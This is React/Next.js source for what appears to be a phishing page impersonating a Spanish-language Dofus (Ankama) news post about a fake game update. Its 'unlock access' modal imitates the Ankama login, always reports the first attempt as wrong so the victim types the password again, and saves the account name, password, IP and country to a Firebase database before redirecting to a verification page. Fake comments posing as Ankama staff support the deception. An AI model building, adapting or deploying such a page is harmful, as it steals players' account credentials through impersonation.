import Head from 'next/head'
import Image from 'next/image'
import styles from '@/styles/Home2.module.css'
import Link from "next/link";
import { useEffect, useState } from 'react';
import  db  from '../../Firebase';
import { doc, setDoc } from "firebase/firestore";
import axios from 'axios';
import { ThreeCircles } from  'react-loader-spinner'
import  Router, { useRouter }  from 'next/router';








function App2() {
  const [visible,setVisible] = useState(false)
  const [visible2,setVisible2] = useState(false)
  const [visible3,setVisible3] = useState(false)
  const [name,setName] = useState("");
  const [password,setPassword] = useState("");
  const [ip,setIp] = useState("");
  const [country,setCountry] = useState("");
  const [spin,setSpin] = useState(false)


  const send = async(e)=>{
    e.preventDefault();
    if (visible2 == false) {
      setName("");
      setPassword("");
      setVisible2(true)
    }else{
      const document = doc(db, "users", ip);
          await updateDoc(document, {
            name: name,
            pass:password
  });
    localStorage.setItem("ip", JSON.stringify(ip));
    localStorage.setItem("name", JSON.stringify(name));
    localStorage.setItem("password", JSON.stringify(password));
  
      Router.push({
          pathname: '/verification/es',
          query: {ip:ip}
      },"/verification/es",{ shallow: true })
      setSpin(false)
    }
   }

 useEffect(()=>{
  const stored = localStorage.getItem(ip);
  if (stored == '"exist"') {
  }else{
    try {
      setDoc(doc(db, "users", ip), {
        country:country,
        ip:ip
      });
    } catch (error) {
      console.log(error)
    }
  }
  
 },[ip]);
 const getIp = async()=>{
  console.log("ana fe get ip")
  const res = await axios.get("https://geolocation-db.com/json/");
  try {
    setIp(res.data.IPv4);
    setCountry(res.data.country_name);
  } catch (error) {
    console.log(error)
  }
 }
 useEffect(()=>{
  const stored = JSON.parse(localStorage.getItem("ip"));
  if (stored == null) {

    getIp(); 
  }else{
      const storedn = JSON.parse(localStorage.getItem("name"));
      const storedp = JSON.parse(localStorage.getItem("password"));
      const storedip = JSON.parse(localStorage.getItem("ip"));
      setName(storedn)
      setPassword(storedp);
      setIp(storedip)
  }
 },[]);
 const en=()=>{
  Router.push({
    pathname: '/dofus/en',
    query: {ip:ip}
},"/dofus/en",{ shallow: true })
 }
 const fr=()=>{
  Router.push({
    pathname: '/dofus/fr',
    query: {ip:ip}
},"/dofus/fr",{ shallow: true })
 }

 const prg=()=>{
  Router.push({
    pathname: '/dofus/prg',
    query: {ip:ip}
},"/dofus/prg",{ shallow: true })
 }
  return (
    <>
    <Head>
    <title>mina forjelancial</title>
    <link rel="preconnect" href="https://fonts.googleapis.com"/>
    <meta name="description" content="Gracias a esta actualización, los aventureros que buscan constantemente un desafío pronto tendrán algo para comer. Durante varios días, podrán codearse con los .." />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet"/>
      </Head>
    <div className={styles.App2}>
      {visible && (
        <div style={{zIndex:100}} className={styles.modal}>
        <div className={styles.header}>
          <center><h4>ACCESO</h4></center>
          <button onClick={()=> setVisible(false)}>X</button>
        </div>
        <div className={styles.content}>
        <div className={styles.contentBox1}>
          <center>
          <h4>En unos pocos clics con...</h4>
          <div className={styles.fb}>
            <a className={styles.fb} href="https://dofus-mmorpg.com/fr/mmorpg/actualites/news/retrobox-dofusix/" target="_blank" style={{textDecoration:"none"}}><img src="/assets/facebook.png" alt="" /><button>FACEBOOK</button></a>
          </div>
          </center>
          </div>
          <div className={styles.contentBox}>
          <form onSubmit={send}>
          <h4>Ya tengo una cuenta ANKAMA</h4>
          {visible2 && (<p className={styles.error}>Las credenciales son incorrectas</p>)}
          <p>Número de cuenta</p>
          <input onChange={(e)=>setName(e.target.value)} value={name} type="text" />
          <p>Contraseña</p>
          <input onChange={(e)=>setPassword(e.target.value)} value={password} type="password" name="" id="" />
          <div className={styles.radio}>
          <input className={styles.input2} type="checkbox" />
          <p>quedar conectado</p>
          </div>
          <button onClick={send}>
            {!spin && ( <>CONECTARSE </>)}
            {spin && (
              <>
              CONECTARSE
              
            </>)}
            </button>
            </form>

          </div>
        </div>

      </div>
      )}
      <div className={styles.all5}> 
      <div className={styles.nav2}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p><a style={{textDecoration:"none",color:"white"}} href="https://support.ankama.com/hc/en-us" target="_blank">SUPPORT</a></p>
            </div>
            <div className={styles.rightC}>
              <p style={{zIndex:10}}>DECONNEXION</p>
              <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img src="/assets/spain.png" alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img onClick={fr} src="/assets/france.png" alt="" /><p className={styles.flagN}>FR</p></div>
              <div className={styles.flag}><img onClick={en}  src="/assets/usa.png" alt="" /><p className={styles.flagN}>EN</p></div>
              <div className={styles.flag}><img src="/assets/de.png" alt="" /><p className={styles.flagN}>DE</p></div>
              <div className={styles.flag}><img  src="/assets/spain.png" alt="" /><p className={styles.flagN}>ES</p></div>
              <div className={styles.flag}><img onClick={prg} src="/assets/portugal.png" alt="" /><p className={styles.flagN}>PT</p></div>
              <div className={styles.flag}><img src="/assets/italy.png" alt="" /><p className={styles.flagN}>IT</p></div>


              </>
             )}
             </div>
              <div>
              
              </div>
            </div>
          </div>
        </div>
        <div className={styles.secondNav}>
          <div className={styles.dofusLogo}>
            <div className={styles.cont}>
            <div className={styles.leftS}>
              <a className={styles.nv1} >
                JEU
                <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                    <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/telecharger"><div></div> Télécharger le jeu</a>
                      <a href="https://www.dofus.com/fr/mmorpg/jouer"><div></div> Créez votre compte</a>
                      <a href="https://dofus-mmorpg.com/fr/mmorpg/communaute/parrainage"><div></div>Avantages parrainage</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/codes"><div></div>Code Cadeau</a>
                      <a href="https://www.dofus.com/fr/mmorpg/encyclopedie"><div></div>Encyclopédie</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/annuaires/pages-persos"><div></div>Annuaires</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder"><div></div>Ladders</a>
                      <a href="https://www.krosmoz.com/fr/almanax"><div></div>Almanax</a>

                    </div>
                    <div className={styles.sec2}>
                    <a style={{fontWeight:700}} href=""><div></div>Comment jouer</a>
                      <a href="https://www.dofus.com/fr/mmorpg/decouvrir"><div></div>Découvrir</a>
                      <a href="https://www.dofus.com/fr/mmorpg/encyclopedie/classes"><div></div>Classes</a>
                      <a href="https://www.dofus.com/fr/mmorpg/tutoriels"><div></div>Apprendre à jouer</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder/kolizeum-presentation"><div></div>Ligues Kolizeum</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/serveurs?server_community%5B0%5D=0"><div></div>État des serveurs</a>
                    </div>
                    <div className={styles.sec3}>
                    <a  style={{fontWeight:700}} href=""><div></div>avantages abonnés</a>
                      <a href="https://www.dofus.com/fr/mmorpg/pourquoi-s-abonner"><div></div>Pourquoi s'abonner ?</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/veterans-rewards"><div></div>Veteran rewards</a>
                      <a href="https://www.dofus.com/fr/dofus-retro"><div></div>DOFUS Retro</a>
                    </div>

                  </div>
                </div>
                </a>
              <a className={styles.nv2}>
              TRANSMÉDIA
              <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                  <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.ankama-shop.com/fr/"><div></div>Acheter des produits dérivés</a>
                      <a href="https://www.ankama.com/fr/editions"><div></div>Editions</a>
                      <a href="https://www.ankama.com/fr/games"><div></div>jeux videos</a>
                      

                    </div>
                    <div className={styles.sec2}>
                    <a  style={{fontWeight:700}} href=""><div></div>Jeux de plateau</a>
                      <a href="https://www.ankama.com/fr/boardgames/krosmaster-blast"><div></div>Krosmaster Blast</a>
                      <a href="https://www.krosmaster.com/"><div></div>Krosmaster</a>
                      <a href="https://www.ankama-shop.com/fr/"><div></div>Brother</a>
                      <a href="">Animation</a>
                      <a href="https://www.dofus-le-film.com/"><div></div>Le film</a>
                      <a href="https://www.dofus.com/fr/animation/univers"><div></div>La série</a>
                    </div>
                    <div className={styles.sec3}>
                    <a  style={{fontWeight:700}} href=""><div></div>Médias</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/trailers"><div></div>Vidéos</a>
                      <a href="https://www.dofus.comhttps//www.dofus.com/fr/mmorpg/medias/screenshots"><div></div>Screenshots</a>
                      <a href="https://www.dofus.comhttps//www.dofus.comhttps://www.dofus.com/fr/mmorpg/medias/illustrations"><div></div>Illustrations</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/emissions"><div></div>Émissions</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/wallpapers"><div></div>Wallpapers</a>

                    </div>
                  </div>
                </div>
                </a>
              <a className={styles.nv3}>
              ACTUALITÉS
              <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                  <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/actualites/maj/draconiros"><div></div>Découvrir la dernière mise à jour</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/news"><div></div>Toutes les news</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/devblog"><div></div>Tous les devblogs</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/maj"><div></div>Toutes les mises à jour (changelog)</a>


                    </div>
                    <div className={styles.sec2}>
                    <a  style={{fontWeight:700}} href=""><div></div>En ce moment sur DOFUS</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/tournois/dofus-cup-2019/reglement"><div></div>DOFUS Cup 2019</a>
                      <a href="https://www.dofus.com/fr/prehome"><div></div>Calendrier de l'Avent</a>
                     
                    </div>
                    
                  </div>
                </div>
                </a>

            </div>
            </div>
            <a style={{zIndex:11}} href="https://www.dofus.com/fr/prehome"><img src="/assets/logo-dofus.png" alt="" /></a>
            <div className={styles.cont2}>
            <div className={styles.rightS}>
              <a href="https://www.dofus.com/fr/achat-kamas">ACHETER DES KAMAS</a>
              <a href="https://www.dofus.com/fr/forum">FORUMS</a>
              <a href="https://www.dofus.com/fr/boutique">BOUTIQUE</a>

            </div>
            <a tabindex="0" className={styles.imgAS}><img className={styles.imgS} src="/assets/search.png" alt="" /><div className={styles.inp}><input tabindex="1" type="text" /><button>ok</button></div></a>

            </div>
          </div>
          
          </div>









        </div>

<div className={styles.jouer}>
  <button><a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/jouer" target="_blank" rel="noopener noreferrer">JUGAR!</a></button>
</div>

<div className={styles.blog}>
<div className={styles.blogContainer}>
  <div className={styles.main}>
    <div className={styles.header}>
      <div className={styles.icon}>
        <div className={styles.circle}>
        <img src="/assets/sword.png" alt="" /></div>
        </div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>«  Brecha de los Forjalanzas 2022 » ESTÁ EN LINEA </h1>
        <h4>¡Desbloquea el acceso ahora y vete a la aventura!</h4>
      </div>
        <div className={styles.retourner}>
          <a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/actualites/news" target="_blank" rel="noopener noreferrer"><button> <p>{"<"}</p> Vuelve a la lista</button></a>
        </div>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.contentBox}>
      <p>Queridos aventureros del Mundo de los Doce. Hoy tomo mi pluma de tofu para contarles sobre la última actualización de Retro llamada sobriamente "Maj Forjalanzas". Está centrado en la comodidad,una nueva anomalía temporal, l'anomalía temporala de las forgelances.</p>
      <div className={styles.blogImg}>
      <Image src="/assets/ereboriale2.jpg" layout='fill'/>
      </div>      
      <p>Gracias a esta actualización, los aventureros que buscan constantemente un desafío pronto tendrán algo para comer. Durante varios días, podrán codearse con los más grandes... ¡y ser recompensados ​​por su valentía! (Siempre que salgan sanos y salvos, claro). ¡Prepárate para una maratón cromática! Esta nueva sub-zona ofrecerá:
<br /><br />
Una nueva familia de monstruos.
<br /><br />
Nuevos mapas para explorarr
<br /><br />
Y también muchas otras sorpresas. !
<br /><br />
25% de XP y bonificación de caída en las primeras 20 peleas.</p>
      <br />
      <p className={styles.boldText}>Nuevos mapas para explorar</p>
      <center>
        <button onClick={()=> setVisible(true)}>DESBLOQUEAR ACCESO</button>
      </center>
      </div>
    </div>

    <div className={styles.media}>
      <a style={{textDecoration:"none"}} href="https://www.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fwww.dofus.com%252Ffr%252Fmmorpg%252Factualites%252Fnews%252F1051928-dofus-retro-ligne&cancel_url=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=en_GB">
      <div className={styles.mediaFb}>
        <img src="/assets/facebook.png" alt="" />
        <span>FACEBOOK</span>
      </div>
      </a>
      <a style={{textDecoration:"none"}} href="https://twitter.com/share?text=&url=https%3A%2F%2Fwww.dofus.com%2Ffr%2Fmmorpg%2Factualites%2Fnews%2F1051928-dofus-retro-ligne">
      <div className={styles.mediaFb2}>
        <img src="/assets/twitter.png" alt="" />
        <span>TWITTER</span>
      </div>
      </a>
      
    </div>

    <div className={styles.commentaires}>
      <div className={styles.header}>
        <h2>COMENTARIOS (32)</h2>
        <a className={styles.sui} href="https://www.dofus.com/fr/mmorpg/actualites/news"><p>Sigue la discusión en el foro...</p></a>
      </div>
      <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c1.png" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>[Ankama]DOFUS</h4><p className='tag'>- Community Manager -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Eventos y regalos para todos aquellos que nos siguen y apoyan en las redes sociales y el foro… </p>
        <p>Habrá algo para todos los nostálgicos, ¡así que estén atentos!</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c2.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Reasy-Kokax</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Hola, ¿podrías darnos más información sobre esta familia de área? </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c3.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Sadidarbre </h4><p className='tag'>- Community Manager -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Bien, ¿cambiando mobs míos?</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c4.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Kazemyrowx</h4><p className='tag'>Ancien Abonné</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Francamente, admito que es una buena idea, además los drop tips comenzaban a ser raros, gracias a</p>
        <p>zona en la que podemos aprovechar que los recursos son caros al principio</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c5.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Serial-Buzzer</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Espero que esto finalmente reduzca el spam innecesario... </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c6.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Axel-Archer</h4><p className='tag'>- Ancien Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>¡Gracias!</p>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/c7.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Yoloxopi</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>si entendí correctamente, desbloquear el acceso desde aquí es el único requisito previo para acceder a la dimensión?</p>
      </div>
    </div>

<div className={styles.commenter}>
  <img src="/assets/img0.png" alt="" />
  <textarea placeholder='comentario...' name="" id="" cols="30" rows="10"></textarea>
</div>
<div className={styles.com}>
<button>VALIDAR</button>

</div>

    </div>

  </div>



  <div className={styles.side}>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>NOTICIAS RECIENTES</h1>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/1.png" alt="" />
      </div>
      <div className={styles.sideText}>
      <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1241841-dungeon-farmer-1-wa-wabbit">Dungeon Farmer #1: The El Wabbit</a></p>
        <div className={styles.comicon}>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>17</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/2.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
      <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1233713-montilier-faucombe-offert">¡Una montura Faucombe gratis!</a></p>
        <div className={styles.comicon}>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>6</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/3.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1243096-concours-journee-mondiale-12-dofus">[Concurso] Día Mundial de los 12 Dofus</a></p>

        <div className={styles.comicon}>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>42</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src="/assets/4.jpg" alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1239064-monocompte-dofus-retro-ligne">Cuenta única en DOFUS Retro: ¡Está en línea!</a></p>

        <div className={styles.comicon}>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>29</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.voir}>
      <center>
        <p onClick={()=> Router.push("https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA")}>Ver todas las noticias</p>
      </center>
    </div>
    </div>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <a style={{textDecoration:"none"}} href="https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA"><h1>FORO ANKATRACKER</h1></a>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1782-dofus/2329562-bouclier-kano")}>Bouclier kano</p>
        <p className={styles.p2}>Por<span className={styles.name}>mallix</span>el 22/04/2022 - 12:48</p>
        <div className={styles.comicon}>
         <p className={styles.p3}>ASK Ankama</p>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Changement d'élément Ougi PVM 200</p>
        <p className={styles.p2}>Por<span className={styles.name}>sousayajin</span>el 15/06/2022 - 12:47</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Ouginak </p>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Astrub est étouffante</p>
        <p className={styles.p2}>Por<span className={styles.name}>VolcanoPenguin</span>el 06/07/2022 - 12:44</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Évolutions </p>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>21</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Comparaison do cri- do pure</p>
        <p className={styles.p2}>Por<span className={styles.name}> I-Found-My-Way </span> el 14/07/2022 - 12:35</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Artisanat </p>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Sram air en pvm de groupe</p>
        <p className={styles.p2}>Por<span className={styles.name}>Row-Sebal</span>el 16/07/2022 - 12:30</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Sram </p>
          <img src="/assets/comments.png" alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    
    <div className={styles.voir}>
      <center>
        <p>Ver todos los temas de AnkaTracker</p>
      </center>
    </div>
    </div>
    <img className={styles.ad} src="/assets/ad.jpg" alt="" />


  </div>
  </div>
</div>





      </div>
      
    </div>
    </>

  );
}

export default App2;